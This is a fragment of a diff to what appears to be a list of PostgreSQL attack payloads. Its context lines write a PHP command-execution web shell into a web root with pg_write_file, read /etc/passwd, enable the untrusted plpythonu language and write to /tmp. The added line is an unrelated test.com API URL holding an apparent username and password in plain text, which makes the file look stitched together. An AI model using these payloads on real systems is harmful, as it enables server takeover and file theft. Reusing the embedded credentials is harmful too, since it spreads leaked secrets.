@@ -34,6 +34,8 @@ SELECT pg_write_file('/var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>'
 SELECT pg_read_file('/etc/passwd', 0, 1000);
 CREATE EXTENSION plpythonu;
 
+https://test.com/Egon/EgonLstJSON?LST=LstDpt&USER=wp&PASW=wp1299&WPXISO=ITA&FLXDSXDPT=1&NR9CND=200
+
 DO $$
 BEGIN
   PERFORM pg_write_file('/tmp/test.txt', 'This is a test file written by PostgreSQL.');
